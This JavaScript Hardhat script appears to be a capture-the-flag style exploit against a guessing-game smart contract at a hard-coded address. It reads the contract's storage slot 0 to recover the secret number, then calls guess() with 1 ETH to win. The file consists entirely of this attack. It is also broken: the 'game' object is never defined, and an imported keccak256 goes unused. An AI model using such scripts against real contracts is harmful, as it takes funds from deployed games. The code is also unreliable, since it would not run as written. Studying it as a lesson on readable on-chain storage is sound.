const { BigNumber, ethers } = require("ethers");
const { parseEther } = require("ethers/lib/utils");
const keccak256 = require("keccak256");
const GAME_ADDRESS = "0x2365148bfF089eB23101a0109aaa98F0e2245523";

async function main() {
  const num = await hre.ethers.provider.getStorageAt(GAME_ADDRESS, 0);

  const tx = await game.guess(BigNumber.from(num), {
    value: parseEther("1.0"),
  });
  const receipt = await tx.wait();

  console.log(receipt);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
